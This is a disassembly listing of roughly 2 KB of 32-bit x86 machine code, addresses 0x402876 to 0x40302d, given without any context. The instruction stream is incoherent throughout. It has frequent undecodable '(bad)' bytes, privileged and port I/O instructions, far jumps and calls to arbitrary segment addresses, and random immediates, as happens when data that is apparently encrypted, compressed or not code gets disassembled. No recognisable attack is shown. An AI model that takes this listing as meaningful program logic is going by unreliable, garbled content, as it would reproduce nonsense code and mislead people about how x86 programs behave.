  402876:	(bad)  
  402877:	push   ebx
  402878:	xor    BYTE PTR [ebx-0x2c471e39],al
  40287e:	inc    esp
  40287f:	nop
  402880:	ret    
  402881:	inc    ebx
  402882:	mov    dh,BYTE PTR [eax-0x5ccd15d3]
  402888:	popa   
  402889:	into   
  40288a:	jecxz  0x402833
  40288c:	int    0x8b
  40288e:	push   es
  40288f:	sbb    al,BYTE PTR [ebp+ebp*1+0x2e]
  402893:	or     eax,0xe13b6ecc
  402898:	pushf  
  402899:	xchg   ebx,eax
  40289a:	dec    edi
  40289b:	sub    bl,al
  40289d:	or     DWORD PTR [esi+0x6b],esi
  4028a0:	dec    edx
  4028a1:	aad    0xeb
  4028a3:	xlat   BYTE PTR ds:[ebx]
  4028a4:	rcr    DWORD PTR [edx+esi*1],cl
  4028a7:	pop    esp
  4028a8:	nop
  4028a9:	dec    ebp
  4028aa:	add    DWORD PTR ds:0xca587d59,esp
  4028b0:	and    cl,ah
  4028b2:	(bad)  
  4028b3:	mov    bh,0xa9
  4028b5:	jl     0x402918
  4028b7:	inc    edi
  4028b8:	dec    esi
  4028b9:	and    ebx,DWORD PTR [esi+0x531188a7]
  4028bf:	jae    0x402897
  4028c1:	mov    ds:0x9814feb6,eax
  4028c6:	call   0xfd37:0x2c03ee50
  4028cd:	mov    WORD PTR [eax+ecx*8],ds
  4028d0:	out    0x4a,al
  4028d2:	adc    eax,0x711a7c28
  4028d7:	in     al,0x10
  4028d9:	xchg   BYTE PTR [edi],bl
  4028db:	loopne 0x4028d0
  4028dd:	pop    ecx
  4028de:	jp     0x4028ec
  4028e0:	jecxz  0x4028de
  4028e2:	rcl    cl,cl
  4028e4:	test   eax,0x8effcfd5
  4028e9:	add    DWORD PTR [esi-0x16],edi
  4028ec:	addr16 out dx,al
  4028ee:	and    ch,BYTE PTR [ebx]
  4028f0:	pusha  
  4028f1:	pop    es
  4028f2:	repz jg 0x40290e
  4028f5:	push   edi
  4028f6:	(bad)  
  4028f7:	jecxz  0x402894
  4028f9:	mov    dh,0xbb
  4028fb:	fst    DWORD PTR [eax+esi*8]
  4028fe:	mov    es,WORD PTR [ebp-0x32]
  402901:	int3   
  402902:	shr    BYTE PTR [eax],0xe7
  402905:	(bad)  
  402906:	or     dl,ah
  402908:	into   
  402909:	test   eax,0xccfe87fe
  40290e:	inc    edi
  40290f:	bound  edi,QWORD PTR [esi+ecx*8-0x69]
  402913:	mov    ds:0x6a5599ae,eax
  402918:	push   edi
  402919:	bound  eax,QWORD PTR [ebp+0x27e20f7d]
  40291f:	(bad)  
  402920:	rcr    DWORD PTR ds:0x7bdf2b8f,0x50
  402927:	arpl   WORD PTR [edi-0x4239c863],dx
  40292d:	push   0xffffffef
  40292f:	inc    edx
  402930:	and    dh,BYTE PTR [ecx+0x56cfe7e5]
  402936:	je     0x40298c
  402938:	mov    ch,0x87
  40293a:	add    eax,0x47dda75
  40293f:	jo     0x402905
  402941:	jg     0x4029b0
  402943:	dec    ecx
  402944:	cmp    BYTE PTR [ecx],0x3e
  402947:	and    dh,cl
  402949:	inc    esp
  40294a:	dec    edx
  40294b:	ins    BYTE PTR es:[edi],dx
  40294c:	ret    0xef94
  40294f:	adc    bh,al
  402951:	mov    esi,0xe386c950
  402956:	adc    al,0xda
  402959:	fbstp  TBYTE PTR [edx-0x45]
  40295c:	jnp    0x40299a
  40295e:	xor    eax,0x2d03f4a7
  402963:	les    ecx,FWORD PTR [ecx-0x1b]
  402966:	sahf   
  402967:	pop    ecx
  402968:	pop    eax
  402969:	outs   dx,BYTE PTR ds:[esi]
  40296a:	push   0x37e54ff4
  40296f:	ins    DWORD PTR es:[edi],dx
  402970:	xor    DWORD PTR [eax-0x42],esp
  402973:	rcr    DWORD PTR [edx-0x1e],0x4c
  402977:	aaa    
  402978:	jge    0x4029eb
  40297a:	sbb    al,0x0
  40297c:	out    dx,eax
  40297d:	ret    0xa389
  402980:	aam    0x6c
  402982:	push   eax
  402983:	sub    eax,0xd71a564c
  402988:	mov    esi,0xad243052
  40298d:	ss icebp 
  40298f:	ret    0x99a3
  402992:	popf   
  402993:	scas   al,BYTE PTR es:[edi]
  402994:	mov    esp,0x158ed6f2
  402999:	cmp    eax,DWORD PTR es:[eax+0x6775359c]
  4029a0:	scas   eax,DWORD PTR es:[edi]
  4029a1:	sbb    ebx,DWORD PTR [esp+edx*4-0x1c88a12c]
  4029a8:	pop    ecx
  4029a9:	cmp    al,BYTE PTR [ebp+0x2d]
  4029ac:	mov    bh,0x8
  4029ae:	xlat   BYTE PTR ds:[ebx]
  4029af:	loope  0x402a25
  4029b1:	mov    DWORD PTR [esi],ebx
  4029b3:	push   ds
  4029b4:	mov    eax,0x9922227b
  4029b9:	mov    al,ds:0xd44c97b8
  4029be:	in     eax,0xa0
  4029c0:	test   BYTE PTR [ecx],cl
  4029c2:	cwde   
  4029c3:	and    edx,ebp
  4029c5:	(bad)  
  4029c6:	loope  0x4029b0
  4029c8:	cmp    DWORD PTR [ebx],edx
  4029ca:	lods   eax,DWORD PTR ds:[esi]
  4029cb:	or     eax,0x3e946e6b
  4029d0:	pop    esp
  4029d1:	and    DWORD PTR [ebp+0x1],esi
  4029d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029d5:	lahf   
  4029d6:	iret   
  4029d7:	fld    TBYTE PTR [edi]
  4029d9:	cmp    BYTE PTR [esi-0xe],ch
  4029dc:	out    0x34,eax
  4029de:	jecxz  0x402a52
  4029e0:	or     bl,BYTE PTR [ecx]
  4029e2:	adc    BYTE PTR [ebp-0x15],ah
  4029e5:	mov    ebx,0x8cb3d957
  4029ea:	shl    cl,0x75
  4029ed:	jp     0x402972
  4029ef:	je     0x402a03
  4029f1:	daa    
  4029f2:	and    dl,bl
  4029f4:	xor    dh,BYTE PTR [ebp+0x2c]
  4029f7:	inc    esi
  4029f8:	inc    eax
  4029f9:	add    al,0x8c
  4029fb:	sbb    bl,BYTE PTR [eax]
  4029fd:	pop    ebp
  4029fe:	bound  esi,QWORD PTR [edx+0x7555e0f2]
  402a04:	push   ebx
  402a05:	add    eax,0x6bb9ce20
  402a0a:	inc    ecx
  402a0b:	loopne 0x4029c1
  402a0d:	rcl    BYTE PTR [ebp+0x5e6f20ba],cl
  402a13:	cld    
  402a14:	rcr    DWORD PTR [ebx],0xe0
  402a17:	rcr    al,cl
  402a19:	and    edi,eax
  402a1b:	lds    esi,FWORD PTR [eax+esi*1]
  402a1e:	(bad)
  402a21:	aas    
  402a22:	icebp  
  402a23:	rol    DWORD PTR [edi],0xd
  402a26:	or     edx,DWORD PTR [ebx]
  402a28:	xor    DWORD PTR [esp+eiz*4-0x77],ebp
  402a2c:	stc    
  402a2d:	in     eax,0x8c
  402a2f:	dec    eax
  402a30:	loop   0x402a41
  402a32:	mov    cl,0x59
  402a34:	sbb    ebp,DWORD PTR [ebx-0x5f7ddca1]
  402a3a:	sbb    al,al
  402a3c:	shl    BYTE PTR [edi+0x65],1
  402a3f:	shl    DWORD PTR [edi-0x545dce89],1
  402a45:	pop    ecx
  402a46:	sbb    ch,BYTE PTR [esi+eax*4]
  402a49:	sub    DWORD PTR [edx+ebx*4-0x2a],esp
  402a4d:	lods   al,BYTE PTR ds:[esi]
  402a4e:	ss xchg esp,eax
  402a50:	pusha  
  402a51:	inc    eax
  402a52:	shl    ebx,0x5a
  402a55:	xor    ebx,DWORD PTR [edx-0x4af9f762]
  402a5b:	inc    eax
  402a5c:	pop    ebx
  402a5d:	jecxz  0x4029e5
  402a5f:	jg     0x402a26
  402a61:	cmc    
  402a62:	lods   al,BYTE PTR ds:[esi]
  402a63:	sti    
  402a64:	sub    cl,0xcf
  402a67:	cwde   
  402a68:	mov    eax,ds:0xa5ff067d
  402a6d:	push   0xbbe32fab
  402a72:	adc    DWORD PTR [ebx],esi
  402a74:	jmp    0x217a:0x3b6b5512
  402a7b:	out    0x7f,al
  402a7d:	push   ebx
  402a7e:	cdq    
  402a7f:	stos   BYTE PTR es:[edi],al
  402a80:	jnp    0x402aa4
  402a82:	cmp    dh,BYTE PTR [eax-0x3d]
  402a85:	ds jecxz 0x402aac
  402a88:	pusha  
  402a89:	add    DWORD PTR [ebx+edi*1-0x5293cc5d],esi
  402a90:	sub    DWORD PTR [edx-0x4],ebx
  402a93:	dec    edi
  402a94:	mul    BYTE PTR [ebx+0x346506b7]
  402a9a:	test   BYTE PTR [eax],bh
  402a9c:	xchg   edi,eax
  402a9d:	nop
  402a9e:	rcl    DWORD PTR [ecx],1
  402aa0:	mov    ds:0xddb21cfb,eax
  402aa5:	sti    
  402aa6:	je     0x402af3
  402aa8:	xchg   ebx,eax
  402aa9:	(bad)  
  402aaa:	adc    bh,BYTE PTR [ebx+0x12]
  402aad:	cmp    al,BYTE PTR [ebx]
  402aaf:	mov    ds:0xbb0a23d6,al
  402ab4:	mov    esi,ebp
  402ab6:	and    al,0xc2
  402ab8:	xor    DWORD PTR [esi-0x11],ebx
  402abb:	pop    esi
  402abc:	jge    0x402a7e
  402abe:	sub    BYTE PTR [eax],0x66
  402ac1:	jmp    0x1074:0x998949c5
  402ac8:	mov    dl,0x50
  402aca:	std    
  402acb:	adc    BYTE PTR [esi-0x2d],ah
  402ace:	sbb    BYTE PTR [esi+0x4],dh
  402ad1:	cdq    
  402ad2:	adc    al,BYTE PTR [eax]
  402ad4:	loopne 0x402aa3
  402ad6:	icebp  
  402ad7:	imul   edx,edx,0xd1a5ec09
  402add:	mov    ebp,0xb873a4b
  402ae2:	and    sp,WORD PTR [edi]
  402ae5:	cwde   
  402ae6:	sbb    eax,0x7d426fa3
  402aeb:	jnp    0x402a7d
  402aed:	sbb    DWORD PTR [eax],esp
  402aef:	test   eax,0x387e886a
  402af4:	adc    eax,0x24c4cb98
  402af9:	mov    ah,0x25
  402afb:	pop    esi
  402afc:	and    DWORD PTR [ecx],edx
  402afe:	inc    edx
  402aff:	mov    BYTE PTR [edx+0x3448110c],dh
  402b05:	fdivr  DWORD PTR [edi-0x6d]
  402b08:	and    BYTE PTR [edi+0x28],0x0
  402b0c:	jle    0x402ada
  402b0e:	or     dl,BYTE PTR [ebp+0x41007848]
  402b14:	sbb    DWORD PTR [ebp-0x20],0x2
  402b18:	adc    eax,0x15b79977
  402b1d:	mov    ecx,0xbaf4e99a
  402b22:	xchg   edi,eax
  402b23:	add    DWORD PTR [esi],ebx
  402b25:	and    al,0x2b
  402b27:	push   esi
  402b28:	pop    ds
  402b29:	(bad)  
  402b2a:	int    0x7b
  402b2c:	mov    ah,0xf1
  402b2e:	lods   al,BYTE PTR ds:[esi]
  402b2f:	add    eax,0xdc4124fa
  402b34:	shl    dh,1
  402b36:	or     DWORD PTR [eax],esi
  402b38:	fstp   st(2)
  402b3a:	xor    eax,0x172a037a
  402b3f:	dec    edx
  402b40:	mov    ds:0x588474ac,eax
  402b45:	test   BYTE PTR [ebx+0x7f],ah
  402b48:	push   esi
  402b49:	jecxz  0x402b31
  402b4b:	leave  
  402b4c:	je     0x402ad0
  402b4e:	loopne 0x402b4d
  402b50:	mov    bh,0x8c
  402b52:	mov    bl,0x7c
  402b54:	ret    
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	mov    ch,0xdf
  402b58:	pop    ds
  402b59:	dec    edx
  402b5a:	fidiv  WORD PTR [edx+0x59]
  402b5d:	sbb    eax,0x448c6c48
  402b62:	(bad)  
  402b63:	call   DWORD PTR [esi]
  402b65:	inc    eax
  402b66:	bnd jbe 0x402b62
  402b69:	hlt    
  402b6a:	das    
  402b6b:	cmc    
  402b6c:	repz rcl BYTE PTR [edi],1
  402b6f:	nop
  402b70:	sar    al,cl
  402b72:	setge  BYTE PTR ds:0x374f99ac
  402b79:	cmpxchg DWORD PTR [esi+0x2c],ecx
  402b7d:	push   ebp
  402b7e:	jmp    0xc94c:0x8e5f971
  402b85:	mov    ch,0xc1
  402b87:	xor    eax,0x515e0a1b
  402b8c:	sahf   
  402b8d:	fs (bad) 
  402b8f:	fdiv   DWORD PTR [edx-0x3b]
  402b92:	xchg   ebp,eax
  402b93:	into   
  402b94:	(bad)
  402b97:	aaa    
  402b98:	clc    
  402b99:	dec    ebx
  402b9a:	mov    bl,0x3c
  402b9c:	pop    es
  402b9d:	stc    
  402b9e:	mov    edi,0x7e542a92
  402ba3:	outs   dx,DWORD PTR ds:[esi]
  402ba4:	aaa    
  402ba5:	cmp    eax,0xe3aa93f5
  402baa:	out    dx,al
  402bab:	or     DWORD PTR [esi+0x463c905a],ebx
  402bb1:	aad    0xae
  402bb3:	or     ah,BYTE PTR [eax]
  402bb5:	adc    edx,DWORD PTR [edx]
  402bb7:	sub    al,0xc0
  402bb9:	mov    bl,0x78
  402bbb:	mov    BYTE PTR [eax+0x36],cl
  402bbe:	sar    esi,cl
  402bc0:	push   edx
  402bc1:	jge    0x402b73
  402bc3:	jp     0x402be1
  402bc5:	dec    edi
  402bc6:	es call 0xae3e:0xf58d3526
  402bce:	pop    ds
  402bcf:	shl    BYTE PTR [ebp-0x1],0xe3
  402bd3:	shl    BYTE PTR [ecx+0x1a98b8e4],cl
  402bd9:	cmp    BYTE PTR [edi],ch
  402bdb:	dec    ebp
  402bdc:	cmp    eax,0x445f8831
  402be1:	rcl    BYTE PTR [esi-0x6475221e],0xc0
  402be8:	aaa    
  402be9:	jmp    DWORD PTR [eax-0x3323b50a]
  402bef:	retf   0x91c6
  402bf2:	(bad)  
  402bf3:	ds xor ebp,ebx
  402bf6:	lods   al,BYTE PTR ds:[esi]
  402bf7:	jbe    0x402be0
  402bf9:	hlt    
  402bfa:	lock xor al,0x78
  402bfd:	xchg   ebx,eax
  402bfe:	mov    ds:0x4d90c085,eax
  402c03:	add    BYTE PTR [ebx-0x277c7220],bl
  402c09:	xor    BYTE PTR [edx+0x68e3514e],cl
  402c0f:	call   DWORD PTR [ebx]
  402c11:	jnp    0x402bfa
  402c13:	xchg   ecx,eax
  402c14:	push   0x33f36ecd
  402c19:	movntps XMMWORD PTR [eax+0x73],xmm3
  402c1d:	cmc    
  402c1e:	jae    0x402c5b
  402c20:	ss out dx,al
  402c22:	lahf   
  402c23:	mov    bl,0xa2
  402c25:	add    bh,dl
  402c27:	xor    esp,ebx
  402c29:	les    eax,FWORD PTR [eax]
  402c2b:	jp     0x402c42
  402c2d:	sub    BYTE PTR [esp+ebp*8],bl
  402c30:	popa   
  402c31:	xor    al,dh
  402c33:	stos   BYTE PTR es:[edi],al
  402c34:	inc    eax
  402c35:	jae    0x402c88
  402c37:	out    dx,eax
  402c38:	fdivr  QWORD PTR [ecx+0x107d13a7]
  402c3e:	xchg   BYTE PTR [edx+eax*2+0x30072b90],bh
  402c45:	bound  ecx,QWORD PTR [ebp+0x45]
  402c48:	into   
  402c49:	xlat   BYTE PTR ds:[ebx]
  402c4a:	sub    eax,0x69746a47
  402c4f:	cli    
  402c50:	xor    DWORD PTR [eax-0x10],ecx
  402c53:	call   0x742a9916
  402c58:	sub    dl,BYTE PTR [ebx]
  402c5a:	mov    ecx,0xe7e6f733
  402c5f:	inc    edi
  402c60:	popf   
  402c61:	sahf   
  402c62:	push   edi
  402c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c64:	push   ebp
  402c65:	push   esi
  402c66:	je     0x402bea
  402c68:	dec    esi
  402c69:	push   edi
  402c6a:	add    DWORD PTR [ecx+ecx*1],ecx
  402c6d:	stos   DWORD PTR es:[edi],eax
  402c6e:	xor    BYTE PTR [edx-0x64],0xec
  402c72:	(bad)  
  402c73:	jg     0x402cba
  402c75:	push   ss
  402c76:	sti    
  402c77:	cli    
  402c78:	xchg   DWORD PTR [eax],esi
  402c7a:	call   0x7f1e2771
  402c7f:	jae    0x402ce1
  402c81:	push   edi
  402c82:	in     al,dx
  402c83:	push   ebx
  402c84:	xor    edx,DWORD PTR [ebx]
  402c86:	std    
  402c87:	jmp    0x6bbbbb3c
  402c8c:	push   ebx
  402c8d:	cld    
  402c8e:	pusha  
  402c8f:	or     ch,ah
  402c91:	sbb    cl,BYTE PTR [ecx+0x1304171c]
  402c97:	cmp    edi,0x6d5be818
  402c9d:	dec    eax
  402c9e:	dec    esi
  402c9f:	xor    al,0xdf
  402ca1:	dec    esp
  402ca2:	ss sub ch,bh
  402ca5:	enter  0x7468,0x10
  402ca9:	pop    es
  402caa:	or     DWORD PTR [ebx],eax
  402cac:	gs std 
  402cae:	push   edx
  402caf:	call   0x5ccc365f
  402cb4:	data16 xor al,0x17
  402cb7:	add    esp,eax
  402cb9:	nop
  402cba:	xor    al,0xc
  402cbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cbd:	loopne 0x402cec
  402cbf:	(bad)  
  402cc0:	out    dx,eax
  402cc1:	push   edi
  402cc2:	add    ebx,DWORD PTR cs:[ebp+0x6e8cbf67]
  402cc9:	mov    dh,0x58
  402ccb:	jge    0x402cc1
  402ccd:	or     ebx,esp
  402ccf:	in     al,0x39
  402cd1:	repnz mov eax,0x9bcb7e41
  402cd7:	mov    al,ds:0xd13649dc
  402cdc:	inc    edi
  402cdd:	test   eax,0xd818cf37
  402ce2:	cmp    cl,BYTE PTR [esi+0x68f94743]
  402ce8:	jnp    0x402d4c
  402cea:	or     DWORD PTR [esi+0x30],eax
  402ced:	mov    esp,0x37a6fb00
  402cf2:	and    al,0x5b
  402cf4:	pop    ebx
  402cf5:	mov    ds:0xb4a79d23,al
  402cfa:	xchg   esi,eax
  402cfb:	push   0x66
  402cfd:	mov    edi,0x180594e
  402d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d03:	sbb    eax,0x156a8b01
  402d08:	repz adc edx,DWORD PTR [edx]
  402d0b:	pop    edx
  402d0c:	data16 ins BYTE PTR es:[edi],dx
  402d0e:	clc    
  402d0f:	div    BYTE PTR [edi]
  402d11:	and    esp,DWORD PTR [edx-0x73]
  402d14:	test   DWORD PTR [ecx+0x1a],edi
  402d17:	into   
  402d18:	mov    cl,0xa9
  402d1a:	mov    dh,0x46
  402d1c:	pusha  
  402d1d:	jp     0x402cf1
  402d1f:	rol    BYTE PTR [ebx],0xf6
  402d22:	cwde   
  402d23:	loopne 0x402d00
  402d25:	push   eax
  402d26:	adc    eax,DWORD PTR [ecx+0x24]
  402d29:	mov    bh,0xd5
  402d2b:	jp     0x402d22
  402d2d:	mov    esi,0x76b1b627
  402d32:	lea    edi,[esi+0x31]
  402d35:	popf   
  402d36:	mov    ah,0xc4
  402d38:	xor    ah,cl
  402d3a:	xor    al,0xcb
  402d3c:	ret    0xc6c2
  402d3f:	fsubr  DWORD PTR [ecx+0x6bbb145b]
  402d45:	xor    esi,DWORD PTR [esi-0x67]
  402d48:	xchg   ecx,eax
  402d49:	ja     0x402d48
  402d4b:	and    DWORD PTR [eax-0x68],ebx
  402d4e:	sti    
  402d4f:	or     BYTE PTR [esp+edi*2-0x72],ch
  402d53:	loopne 0x402d1a
  402d55:	xchg   esp,eax
  402d56:	push   ss
  402d57:	pop    ecx
  402d58:	hlt    
  402d59:	mov    al,BYTE PTR [edi]
  402d5b:	inc    ebp
  402d5c:	add    eax,0x613421e5
  402d61:	sub    eax,0xa0519e7b
  402d66:	ins    BYTE PTR es:[edi],dx
  402d67:	cmc    
  402d68:	ja     0x402d86
  402d6a:	pop    esi
  402d6b:	dec    eax
  402d6c:	pop    ss
  402d6d:	mov    esp,0x539694bf
  402d72:	xor    eax,0x7b08f78c
  402d77:	xchg   esi,eax
  402d78:	sbb    eax,0x3c8df6cc
  402d7d:	mov    cl,0x50
  402d7f:	xor    al,0x60
  402d81:	push   0x22
  402d83:	xor    ebx,ebx
  402d85:	and    eax,0x35c24547
  402d8a:	adc    ch,BYTE PTR [ebx-0x2ff5e1eb]
  402d90:	mov    al,ds:0xa7a2b406
  402d95:	adc    ebx,DWORD PTR [esi+0x7]
  402d98:	inc    esp
  402d99:	(bad)  
  402d9a:	mov    dl,0x2d
  402d9c:	add    DWORD PTR [ebx+0x69],edi
  402d9f:	and    ecx,edx
  402da1:	leave  
  402da2:	popa   
  402da3:	mov    dl,0x8c
  402da5:	test   dl,dl
  402da7:	mov    eax,0xcb067059
  402dac:	mov    ds:0x1f0c42f,eax
  402db1:	xchg   esp,eax
  402db2:	(bad)  
  402db3:	mov    ds:0xbb190792,eax
  402db8:	and    al,0xd3
  402dba:	jne    0x402e02
  402dbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dbd:	fiadd  WORD PTR [edx+0x741c430a]
  402dc3:	add    eax,DWORD PTR [ebx+edx*8-0x576875d6]
  402dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dcb:	sub    edx,DWORD PTR [esi-0x1e]
  402dce:	xor    esi,ebp
  402dd0:	mov    esi,ebp
  402dd2:	fld    QWORD PTR [ecx]
  402dd4:	outs   dx,BYTE PTR ds:[esi]
  402dd5:	in     eax,0x9
  402dd7:	sub    ah,bh
  402dd9:	test   eax,0xdda9afc7
  402dde:	inc    eax
  402ddf:	push   0xffffff89
  402de1:	mov    cs,WORD PTR [ebx-0x47]
  402de4:	fstp   DWORD PTR [ecx-0x65]
  402de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402de8:	fcom   QWORD PTR [edx+edi*4-0x2a]
  402dec:	shr    DWORD PTR [ebp-0x1c],0xcb
  402df0:	inc    ecx
  402df1:	sub    eax,0x97df2e77
  402df6:	mov    cl,0x40
  402df8:	ja     0x402e4f
  402dfa:	test   DWORD PTR [ecx-0x22],ecx
  402dfd:	xchg   edi,esp
  402dff:	frstor [ecx]
  402e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e02:	aad    0x3f
  402e04:	stc    
  402e05:	adc    BYTE PTR [ecx+0xe97f8ae],bh
  402e0b:	sub    DWORD PTR [ebx],ebx
  402e0d:	xchg   DWORD PTR [eax],edx
  402e0f:	pop    ebx
  402e10:	gs cmc 
  402e12:	cld    
  402e13:	js     0x402e05
  402e15:	std    
  402e16:	jmp    0x94e5e5ec
  402e1b:	sbb    ebx,ebx
  402e1d:	inc    edx
  402e1e:	or     cl,ch
  402e20:	mov    ds:0x785dd070,eax
  402e25:	cmp    ebx,ebp
  402e27:	int3   
  402e28:	lds    edi,FWORD PTR [eax-0x4ae0d5b6]
  402e2e:	jmp    0xd3b745bf
  402e33:	push   edx
  402e34:	rcl    eax,0xb5
  402e37:	stc    
  402e38:	shl    DWORD PTR [ebp+eax*4+0x40],cl
  402e3c:	mov    eax,0x3318e49e
  402e41:	cs push 0xf04503f5
  402e47:	xchg   ebp,eax
  402e48:	mov    cl,0x17
  402e4a:	sub    DWORD PTR [edx+0x2d332c2d],edx
  402e50:	lahf   
  402e51:	mov    ch,0xe7
  402e53:	imul   ecx,DWORD PTR [ebx-0x5dff9c56],0xffffffa4
  402e5a:	cmc    
  402e5b:	or     cl,dl
  402e5d:	in     eax,0x82
  402e5f:	neg    BYTE PTR [ebx]
  402e61:	fdivr  QWORD PTR [ebx]
  402e63:	je     0x402eba
  402e65:	adc    DWORD PTR [ebx+0x3d71ee57],0xee62ea43
  402e6f:	(bad)  
  402e70:	xchg   ebp,eax
  402e71:	lds    edi,FWORD PTR [edi-0x79]
  402e74:	push   es
  402e75:	dec    esp
  402e76:	inc    esi
  402e77:	adc    al,0xb3
  402e79:	shl    BYTE PTR [ecx],0xfa
  402e7c:	les    edi,FWORD PTR [esi+0x26]
  402e7f:	pop    es
  402e80:	test   al,0xcf
  402e82:	pop    ebp
  402e83:	sahf   
  402e84:	xor    al,0x64
  402e86:	fistp  DWORD PTR [esi-0x69ee15e7]
  402e8c:	jmp    0x6903:0xe8c589ef
  402e93:	xchg   BYTE PTR [edx-0x25],bh
  402e96:	cmp    eax,0xda2781e2
  402e9b:	stos   BYTE PTR es:[edi],al
  402e9c:	push   ds
  402e9d:	cli    
  402e9e:	stos   DWORD PTR es:[edi],eax
  402e9f:	jmp    0x9da827a2
  402ea4:	and    DWORD PTR [edx],esi
  402ea6:	das    
  402ea7:	mov    bh,0x8b
  402ea9:	inc    edi
  402eaa:	sbb    ecx,esi
  402eac:	in     eax,dx
  402ead:	lods   eax,DWORD PTR ds:[esi]
  402eae:	aas    
  402eaf:	lods   al,BYTE PTR ds:[esi]
  402eb0:	loope  0x402e55
  402eb2:	mov    esi,0x6438afb6
  402eb7:	mov    ecx,0x3899141e
  402ebc:	js     0x402ed4
  402ebe:	(bad)  
  402ebf:	arpl   WORD PTR ds:0x63853b5e,cx
  402ec5:	icebp  
  402ec6:	clc    
  402ec7:	cdq    
  402ec8:	jae    0x402f1b
  402eca:	jne    0x402ea5
  402ecc:	ja     0x402eaa
  402ece:	sbb    eax,0x7d0c230
  402ed3:	int    0xa6
  402ed5:	pop    edi
  402ed6:	push   0x5c
  402ed8:	repnz dec ecx
  402eda:	ror    DWORD PTR [ecx],0x6a
  402edd:	int3   
  402ede:	aas    
  402edf:	push   cs
  402ee0:	sar    DWORD PTR [edi+0x137e7ba4],1
  402ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ee7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ee8:	stos   DWORD PTR es:[edi],eax
  402ee9:	xor    eax,0xc790f186
  402eee:	stc    
  402eef:	in     al,0xfa
  402ef1:	ret    
  402ef2:	popf   
  402ef3:	or     DWORD PTR [ebx+0x3d2d1351],esi
  402ef9:	(bad)  
  402efa:	jb     0x402ef4
  402efc:	push   ds
  402efd:	shl    bh,1
  402eff:	jo     0x402e97
  402f01:	push   ebx
  402f02:	jp     0x402f83
  402f04:	mov    ebx,0x99bc0290
  402f09:	(bad)  
  402f0a:	and    di,di
  402f0d:	js     0x402ed7
  402f0f:	jmp    0xe74ca99d
  402f14:	ror    ecx,cl
  402f16:	hlt    
  402f17:	out    0x7,eax
  402f19:	jg     0x402f61
  402f1b:	(bad)
  402f1e:	lock loop 0x402f40
  402f21:	shr    DWORD PTR [ebx],0xe0
  402f24:	mov    ch,0x7b
  402f26:	into   
  402f27:	loope  0x402f3a
  402f29:	cmp    edx,DWORD PTR [esi+0x22]
  402f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f2d:	fldcw  WORD PTR ds:0x720093be
  402f33:	or     al,0x5a
  402f35:	test   eax,0xa4ae4ba0
  402f3a:	test   DWORD PTR [edx-0x6e],edx
  402f3d:	mov    bh,0x68
  402f3f:	push   edi
  402f40:	call   0x3365:0x6e526f96
  402f47:	sub    DWORD PTR [edx+0x19],0xffffff95
  402f4b:	add    ebx,edx
  402f4d:	mov    ah,0xf0
  402f4f:	int3   
  402f50:	scas   eax,DWORD PTR es:[edi]
  402f51:	add    BYTE PTR [edx-0x570b397f],dl
  402f57:	cmp    ebx,DWORD PTR [ebp+eiz*1-0x80]
  402f5b:	jmp    0x402eee
  402f5d:	pop    ss
  402f5e:	popa   
  402f5f:	ret    
  402f60:	mov    esi,0x14b7618f
  402f65:	jmp    0xf94cf374
  402f6a:	adc    al,0xb4
  402f6c:	dec    edx
  402f6d:	add    ecx,ebp
  402f6f:	aaa    
  402f70:	mov    ch,0x2f
  402f72:	(bad)  
  402f73:	xchg   esp,eax
  402f74:	mov    ecx,0x18925117
  402f79:	cmp    al,0x45
  402f7b:	or     al,0x49
  402f7d:	int    0x3f
  402f7f:	add    eax,0xa878cbff
  402f84:	push   eax
  402f85:	mov    eax,ds:0x1d0df01d
  402f8a:	std    
  402f8b:	xor    al,0x39
  402f8d:	and    ebx,DWORD PTR [esi-0x2c914a19]
  402f93:	jg     0x402f2b
  402f95:	pop    esp
  402f96:	into   
  402f97:	and    al,0xbd
  402f99:	ret    
  402f9a:	jb     0x402f34
  402f9c:	cwde   
  402f9d:	not    DWORD PTR [eax+ebx*1-0x3357f772]
  402fa4:	dec    ecx
  402fa5:	out    dx,al
  402fa6:	sub    dh,BYTE PTR [edx+0x44]
  402fa9:	pop    ebp
  402faa:	(bad)  
  402fab:	cmp    al,0x5c
  402fad:	inc    esp
  402fae:	popa   
  402faf:	sub    esp,DWORD PTR [edi-0x3019469c]
  402fb5:	mov    esi,0x9c05cb8b
  402fba:	adc    ch,BYTE PTR [eax+edi*8+0x79fc7a8e]
  402fc1:	mov    al,0x70
  402fc3:	mov    ds:0x22f4e98,eax
  402fc8:	xchg   edx,eax
  402fc9:	mov    dh,0xec
  402fcb:	and    al,0x53
  402fcd:	sub    ebp,edx
  402fcf:	push   0xad016258
  402fd4:	and    al,0x37
  402fd6:	mov    esp,0x92663d2c
  402fdb:	xor    BYTE PTR [edi+0x7b5622f0],cl
  402fe1:	and    al,0x4
  402fe3:	xchg   ecx,eax
  402fe4:	fnstsw WORD PTR [ebp+0x580394f0]
  402fea:	scas   al,BYTE PTR es:[edi]
  402feb:	xor    DWORD PTR [ebx],ecx
  402fed:	jb     0x403037
  402fef:	retf   
  402ff0:	into   
  402ff1:	in     al,0xcd
  402ff3:	cmp    DWORD PTR [ecx],0x2cd57490
  402ff9:	aas    
  402ffa:	cmp    dh,BYTE PTR [edi-0x41]
  402ffd:	or     dl,cl
  402fff:	jl     0x40300f
  403001:	icebp  
  403002:	iret   
  403003:	pop    ss
  403004:	and    al,0x2d
  403006:	xor    DWORD PTR [ebx+edi*2+0x78f48f59],ecx
  40300d:	xchg   ebp,eax
  40300e:	mov    esi,0x1247b0a9
  403013:	mov    esi,0x51f96e4
  403018:	mov    bl,0x33
  40301a:	sub    BYTE PTR [edi+0x35],0x8e
  40301e:	lock cmp dh,BYTE PTR [ebx+0x74]
  403022:	mov    ?,WORD PTR [ecx+edx*2+0x301cf10c]
  403029:	hlt    
  40302a:	leave  
  40302b:	jnp    0x402fe2
  40302d:	push   esi
